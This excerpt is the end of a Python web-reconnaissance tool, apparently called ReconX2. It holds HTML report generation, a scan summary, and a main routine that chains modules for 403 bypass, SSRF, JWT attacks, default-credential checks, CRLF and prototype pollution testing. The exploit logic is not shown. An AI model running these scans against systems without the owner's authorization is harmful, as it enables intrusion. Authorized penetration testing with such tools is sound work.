            f'<div class="sc r"><div class="sn">{n_buck}</div><div class="sl">Cloud Buckets</div></div>'
            f'<div class="sc o"><div class="sn">{n_gql}</div><div class="sl">GraphQL Exposed</div></div>'
            f'<div class="sc o"><div class="sn">{n_idor}</div><div class="sl">IDOR Candidates</div></div>'
            f'<div class="sc b"><div class="sn">{n_swagger_ep}</div><div class="sl">API Endpoints</div></div>'
            f'<div class="sc r"><div class="sn">{n_ssrf}</div><div class="sl">SSRF Critical</div></div>'
            f'<div class="sc r"><div class="sn">{n_domxss}</div><div class="sl">DOM XSS Sinks</div></div>'
            f'<div class="sc y"><div class="sn">{n_wayb}</div><div class="sl">Wayback Secrets</div></div>'
            f'<div class="sc b"><div class="sn">{n_github}</div><div class="sl">GitHub Intel</div></div>'
            f'<div class="sc r"><div class="sn">{n_jwt}</div><div class="sl">JWT Issues</div></div>'
            f'<div class="sc r"><div class="sn">{n_defcr}</div><div class="sl">Default Creds</div></div>'
            f'<div class="sc o"><div class="sn">{n_rl}</div><div class="sl">No Rate Limit</div></div>'
            f'<div class="sc o"><div class="sn">{n_crlf}</div><div class="sl">CRLF Inject</div></div>'
            f'<div class="sc y"><div class="sn">{n_pp}</div><div class="sl">Proto Pollute</div></div>'
            f'</div>\n'
            f'<div class="sh"><h2>403 Bypass Findings</h2></div>\n'
            f'<div class="pre">{rp(f"{self.outdir}/raw/403_bypasses.txt") or "No bypasses found."}</div>\n'
            f'<div class="sh"><h2>CORS Misconfigurations</h2></div>\n'
            f'<div class="pre">{rp(f"{self.outdir}/raw/cors_findings.txt") or "No CORS issues found."}</div>\n'
            f'<div class="sh"><h2>Open Redirects</h2></div>\n'
            f'<div class="pre">{rp(f"{self.outdir}/raw/open_redirects.txt") or "No open redirects found."}</div>\n'
            f'<div class="sh"><h2>Cloud Buckets</h2></div>\n'
            f'<div class="pre">{rp(f"{self.outdir}/raw/cloud_buckets.txt") or "No exposed buckets found."}</div>\n'
            f'<div class="sh"><h2>GraphQL Endpoints</h2></div>\n'
            f'<div class="pre">{rp(f"{self.outdir}/raw/graphql_findings.txt") or "No GraphQL found."}</div>\n'
            f'<div class="sh"><h2>IDOR Candidates</h2></div>\n'
            f'<div class="pre">{rp(f"{self.outdir}/raw/idor_candidates.txt") or "No IDOR candidates found."}</div>\n'
            f'<div class="sh"><h2>GitHub Secret Findings</h2></div>\n'
            f'<div class="pre">{rp(f"{self.outdir}/raw/github_findings.txt") or "No GitHub data."}</div>\n'
            f'<div class="sh"><h2>ASN / IP Range Intelligence</h2></div>\n'
            f'<div class="pre">{rp(f"{self.outdir}/raw/asn_report.txt") or "No ASN data."}</div>\n'
            f'<div class="sh"><h2>Wayback Diff -- Historical Secrets</h2></div>\n'
            f'<div class="pre">{rp(f"{self.outdir}/raw/wayback_diff.txt") or "No diff data."}</div>\n'
            f'<div class="sh"><h2>Swagger / OpenAPI Endpoints</h2></div>\n'
            f'<div class="pre">{rp(f"{self.outdir}/raw/swagger_endpoints.txt") or "No API specs found."}</div>\n'
            f'<div class="sh"><h2>SSRF / Cloud Metadata</h2></div>\n'
            f'<div class="pre">{rp(f"{self.outdir}/raw/ssrf_findings.txt") or "No SSRF found."}</div>\n'
            f'<div class="sh"><h2>DOM XSS Sinks</h2></div>\n'
            f'<div class="pre">{rp(f"{self.outdir}/raw/dom_xss_findings.txt") or "No DOM XSS found."}</div>\n'
            f'<div class="sh"><h2>JWT Analysis</h2></div>\n'
            f'<div class="pre">{rp(f"{self.outdir}/raw/jwt_findings.txt") or "No JWT tokens found."}</div>\n'
            f'<div class="sh"><h2>Host Header Injection</h2></div>\n'
            f'<div class="pre">{rp(f"{self.outdir}/raw/host_header_findings.txt") or "No host header injection found."}</div>\n'
            f'<div class="sh"><h2>API Version Enumeration</h2></div>\n'
            f'<div class="pre">{rp(f"{self.outdir}/raw/api_versions.txt") or "No additional API versions found."}</div>\n'
            f'<div class="sh"><h2>Rate Limit Testing</h2></div>\n'
            f'<div class="pre">{rp(f"{self.outdir}/raw/rate_limit_findings.txt") or "Rate limit test not run."}</div>\n'
            f'<div class="sh"><h2>Default Credentials</h2></div>\n'
            f'<div class="pre">{rp(f"{self.outdir}/raw/default_creds.txt") or "No default creds found."}</div>\n'
            f'<div class="sh"><h2>CRLF Injection</h2></div>\n'
            f'<div class="pre">{rp(f"{self.outdir}/raw/crlf_findings.txt") or "No CRLF injection found."}</div>\n'
            f'<div class="sh"><h2>Prototype Pollution</h2></div>\n'
            f'<div class="pre">{rp(f"{self.outdir}/raw/prototype_pollution.txt") or "No prototype pollution found."}</div>\n'
            f'</div>\n\n'
            # LIGHTBOX
            f'<div class="lb" id="lb" onclick="closeLB()">'
            f'<div class="lb-x" onclick="closeLB()">&#10005;</div>'
            '<div style="display:flex;flex-direction:column;align-items:center;gap:10px" onclick="event.stopPropagation()">'
            '<img id="lb-img" src="" alt="" style="max-width:96vw;max-height:82vh;border-radius:10px">'
            '<div style="display:flex;gap:12px;align-items:center">'
            '<span id="lb-lbl" style="font-family:var(--mono);font-size:12px;color:rgba(255,255,255,.6)"></span>'
            '<a id="lb-url" href="#" target="_blank" onclick="event.stopPropagation()" style="font-size:11px;color:var(--cy)">&#8599; Open</a>'
            '</div></div></div>\n\n'

            # FOOTER
            f'<div class="foot">ReconX2 v{VERSION} &bull; '
            f'<span>{self.domain}</span> &bull; {ts} &bull; '
            f'<span>Author: {AUTHOR}</span> &bull; Authorized security testing only</div>\n\n'

            f'<script>\n'
            f'(function(){{\n'
            f'  document.querySelectorAll(".ni").forEach(function(n){{\n'
            f'    n.addEventListener("click",function(){{\n'
            f'      document.querySelectorAll(".ni,.panel").forEach(function(e){{e.classList.remove("on");}});\n'
            f'      n.classList.add("on");\n'
            f'      var p=document.getElementById("p-"+n.dataset.p);\n'
            f'      if(p) p.classList.add("on");\n'
            f'    }});\n'
            f'  }});\n'
            f'  function fTbl(si,ti){{\n'
            f'    var el=document.getElementById(si);\n'
            f'    if(!el) return;\n'
            f'    el.addEventListener("input",function(){{\n'
            f'      var q=this.value.toLowerCase();\n'
            f'      document.querySelectorAll("#"+ti+" tbody tr").forEach(function(r){{\n'
            f'        r.style.display=r.textContent.toLowerCase().includes(q)?"":"none";\n'
            f'      }});\n'
            f'    }});\n'
            f'  }}\n'
            f'  fTbl("s-sub","t-sub"); fTbl("s-url","t-url");\n'
            f'}})();\n\n'
            f'function cp(t,btn){{\n'
            f'  navigator.clipboard.writeText(t).then(function(){{\n'
            f'    btn.textContent="Copied"; btn.classList.add("ok");\n'
            f'    setTimeout(function(){{btn.textContent="Copy";btn.classList.remove("ok");}},1400);\n'
            f'  }}).catch(function(){{\n'
            f'    var a=document.createElement("textarea");a.value=t;\n'
            f'    document.body.appendChild(a);a.select();\n'
            f'    document.execCommand("copy");document.body.removeChild(a);\n'
            f'  }});\n'
            f'}}\n\n'
            f'function cpAll(){{\n'
            f'  var c=document.querySelectorAll("#t-sub .cc");\n'
            f'  var o=[];\n'
            f'  c.forEach(function(x){{o.push(x.getAttribute("data-v"));}});\n'
            f'  navigator.clipboard.writeText(o.filter(Boolean).join("\\n")).then(function(){{\n'
            f'    var b=document.querySelector(".cab");\n'
            f'    b.textContent="Copied "+o.length+"!";\n'
            f'    setTimeout(function(){{b.textContent="Copy All";}},1800);\n'
            f'  }});\n'
            f'}}\n\n'
            f'function openLB(card){{\n'
            f'  var img=card.querySelector("img");\n'
            f'  if(!img) return;\n'
            f'  document.getElementById("lb-img").src=img.src;\n'
            f'  var lbl=document.getElementById("lb-lbl");\n'
            f'  if(lbl) lbl.textContent=card.dataset.host||"";\n'
            f'  var lnk=document.getElementById("lb-url");\n'
            f'  if(lnk) lnk.href=card.dataset.url||"#";\n'
            f'  document.getElementById("lb").classList.add("open");\n'
            f'  document.body.style.overflow="hidden";\n'
            f'}}\n'
            f'function closeLB(){{\n'
            f'  document.getElementById("lb").classList.remove("open");\n'
            f'  document.body.style.overflow="";\n'
            f'}}\n'
            f'document.addEventListener("keydown",function(e){{if(e.key==="Escape")closeLB();}});\n'
            f'</script>\n'
            f'</body></html>'
        )
        return H


    def print_summary(self):
        section("SCAN COMPLETE — FINAL SUMMARY")
        dur      = int(time.time() - self.start_time)
        h,m,s    = dur//3600, (dur%3600)//60, dur%60
        ss_count = self.db.get_meta("screenshot_count", "0")
        html_rpt = f"{self.outdir}/reports/reconx2_report_{self.domain}.html"
        xlsx_rpt = f"{self.outdir}/reports/reconx2_report_{self.domain}.xlsx"

        print(f"""
{C.BOLD}{C.CYAN}  ╔{'═'*58}╗
  ║   RECONX2  ·  SCAN COMPLETE  ·  {self.domain:<25}║
  ╚{'═'*58}╝{C.RESET}

  {C.BOLD}Target    :{C.RESET}  {C.GREEN}{self.domain}{C.RESET}
  {C.BOLD}Duration  :{C.RESET}  {h}h {m}m {s}s
  {C.BOLD}Output    :{C.RESET}  {self.outdir}/
  {C.BOLD}Database  :{C.RESET}  {self.outdir}/reconx2.db

{C.BOLD}{C.CYAN}  FINDINGS ─────────────────────────────────────────{C.RESET}
  {C.BOLD}Subdomains      {C.RESET}  {C.GREEN}{self.db.count("subdomains"):>6}{C.RESET}   total discovered
  {C.BOLD}Live Hosts      {C.RESET}  {C.GREEN}{self.db.count("subdomains","is_live=1"):>6}{C.RESET}   actively responding
  {C.BOLD}Total URLs      {C.RESET}  {C.GREEN}{self.db.count("urls"):>6}{C.RESET}   across all sources
  {C.BOLD}JS Files        {C.RESET}  {C.YELLOW}{self.db.count("urls","extension='.js'"):>6}{C.RESET}   javascript files
  {C.BOLD}Parameters      {C.RESET}  {self.db.count("parameters"):>6}   unique parameters
  {C.BOLD}Screenshots     {C.RESET}  {C.GREEN}{ss_count:>6}{C.RESET}   captured
  {C.BOLD}Sensitive Paths {C.RESET}  {C.RED}{self.db.count("sensitive_paths","risk_level!='UNCONFIRMED'"):>6}{C.RESET}   confirmed findings
  {C.BOLD}  ↳ Critical    {C.RESET}  {C.RED}{self.db.count("sensitive_paths","risk_level='CRITICAL'"):>6}{C.RESET}
  {C.BOLD}  ↳ High        {C.RESET}  {C.RED}{self.db.count("sensitive_paths","risk_level='HIGH'"):>6}{C.RESET}
  {C.BOLD}  ↳ Unconfirmed {C.RESET}  {C.YELLOW}{self.db.count("sensitive_paths","risk_level='UNCONFIRMED'"):>6}{C.RESET}   (WAF/429 blocked)
  {C.BOLD}Nuclei Findings {C.RESET}  {C.RED}{self.db.count("nuclei_findings"):>6}{C.RESET}
  {C.BOLD}JS w/ Secrets   {C.RESET}  {C.RED}{self.db.count("js_files","has_secret=1"):>6}{C.RESET}

{C.BOLD}{C.CYAN}  REPORTS ─────────────────────────────────────────{C.RESET}
  {C.BOLD}HTML Report  :{C.RESET}  {html_rpt}
  {C.BOLD}XLSX Report  :{C.RESET}  {xlsx_rpt}
  {C.BOLD}Database     :{C.RESET}  {self.outdir}/reconx2.db

{C.BOLD}{C.CYAN}  HOW TO OPEN ──────────────────────────────────────{C.RESET}
  {C.DIM}# Open HTML report in browser:{C.RESET}
  {C.CYAN}xdg-open {html_rpt}{C.RESET}

  {C.DIM}# Or copy to Windows/Mac via scp:{C.RESET}
  {C.CYAN}scp kali@<IP>:{html_rpt} ~/Desktop/{C.RESET}

  {C.DIM}# Query database directly:{C.RESET}
  {C.CYAN}sqlite3 {self.outdir}/reconx2.db "SELECT url,risk_level FROM sensitive_paths WHERE risk_level='CRITICAL'"{C.RESET}

  {C.DIM}# Re-run report only (no new scan):{C.RESET}
  {C.CYAN}python3 reconx2.py -d {self.domain} -o {self.outdir} --report-only --skip-install{C.RESET}

  {C.YELLOW}⚠  For authorized security testing only.{C.RESET}
""")

# ═══════════════════════════════════════════════════════════════════════════
#  MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════
async def main_async():
    banner()
    args = parse_args()

    # Install only mode
    if args.install_only:
        Installer().run()
        return

    if not args.domain and not args.report_only:
        print(f"{C.RED}[!] Domain required. Use: python3 reconx2.py -d example.com{C.RESET}")
        sys.exit(1)

    domain = args.domain.lower().strip() if args.domain else ""

    # Output directory
    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    outdir = args.output or f"reconx2_{domain}_{stamp}"

    print(f"  {C.BOLD}Target    :{C.RESET}  {C.GREEN}{domain}{C.RESET}")
    print(f"  {C.BOLD}Output    :{C.RESET}  {outdir}/")
    print(f"  {C.BOLD}Threads   :{C.RESET}  {args.threads}")
    print(f"  {C.BOLD}Resume    :{C.RESET}  {args.resume}")
    print(f"  {C.BOLD}Skip Heavy:{C.RESET}  {args.skip_heavy}")
    print()
    print(f"  {C.YELLOW}⚠  Only test domains you own or have written authorization to test.{C.RESET}")
    print()

    try:
        input("  Press ENTER to start scan, Ctrl+C to abort... ")
    except KeyboardInterrupt:
        print("\n  Aborted.")
        return
    print()

    # Install tools
    if not args.skip_install:
        Installer().run()

    # Report-only mode
    if args.report_only:
        if not os.path.exists(outdir):
            error(f"Output directory not found: {outdir}")
            sys.exit(1)
        rx = ReconX2(domain, outdir, args.threads,
                     args.wordlist or "", args.resume,
                     args.skip_heavy, args.skip_bruteforce)
        await rx.generate_reports()
        return

    # Full scan
    rx = ReconX2(
        domain=domain,
        outdir=outdir,
        threads=args.threads,
        wordlist=args.wordlist or "",
        resume=args.resume,
        skip_heavy=args.skip_heavy,
        skip_brute=args.skip_bruteforce
    )

    async def safe_run(coro, name):
        try:
            await coro
        except KeyboardInterrupt:
            raise
        except Exception as e:
            error(f"Module [{name}] failed: {e} — continuing to next module")

    try:
        await safe_run(rx.passive_recon(),    "passive_recon")
        await safe_run(rx.subdomain_enum(),   "subdomain_enum")
        await safe_run(rx.live_hosts(),       "live_hosts")
        await safe_run(rx.url_discovery(),    "url_discovery")
        await safe_run(rx.tech_detection(),   "tech_detection")
        await safe_run(rx.port_scan(),        "port_scan")
        await safe_run(rx.ssl_analysis(),     "ssl_analysis")
        await safe_run(rx.js_analysis(),      "js_analysis")
        await safe_run(rx.dir_enum(),         "dir_enum")
        await safe_run(rx.bypass_403(),        "bypass_403")
        await safe_run(rx.cors_test(),         "cors_test")
        await safe_run(rx.open_redirect_test(),"open_redirect")
        await safe_run(rx.cloud_bucket_test(), "cloud_buckets")
        await safe_run(rx.graphql_test(),      "graphql")
        await safe_run(rx.vhost_brute(),       "vhost_brute")
        await safe_run(rx.dns_zone_transfer(), "dns_axfr")
        await safe_run(rx.idor_detection(),    "idor")
        await safe_run(rx.github_hunt(),       "github_hunt")
        await safe_run(rx.asn_enum(),          "asn_enum")
        await safe_run(rx.wayback_diff(),      "wayback_diff")
        await safe_run(rx.swagger_harvest(),   "swagger_harvest")
        await safe_run(rx.cloud_metadata_ssrf(),"cloud_metadata")
        await safe_run(rx.dom_xss_analysis(),  "dom_xss")
        await safe_run(rx.jwt_attack(),         "jwt_attack")
        await safe_run(rx.host_header_injection(),"host_header")
        await safe_run(rx.api_version_enum(),   "api_version")
        await safe_run(rx.rate_limit_test(),    "rate_limit")
        await safe_run(rx.default_creds(),      "default_creds")
        await safe_run(rx.crlf_test(),          "crlf")
        await safe_run(rx.prototype_pollution(),"proto_pollution")
        await safe_run(rx.executive_summary(),  "exec_summary")
        await safe_run(rx.send_alerts(),        "alerts")
        await safe_run(rx.bug_bounty_export(),  "bugbounty")
        await safe_run(rx.scan_diff(),          "scan_diff")
        await safe_run(rx.screenshots(),      "screenshots")
        await safe_run(rx.nuclei_scan(),      "nuclei_scan")
        await safe_run(rx.generate_dorks(),   "generate_dorks")
        await safe_run(rx.generate_reports(), "generate_reports")
        await safe_run(rx.pdf_export(),        "pdf_export")
        rx.print_summary()
    except KeyboardInterrupt:
        print(f"\n\n{C.YELLOW}[!] Ctrl+C — generating partial reports from data collected so far...{C.RESET}\n")
        try:
            await rx.generate_dorks()
            await rx.generate_reports()
        except Exception as e:
            error(f"Report generation failed: {e}")
        rx.print_summary()
    finally:
        try:
            rx.db.close()
        except: pass

def main():
    asyncio.run(main_async())

if __name__ == "__main__":
    main()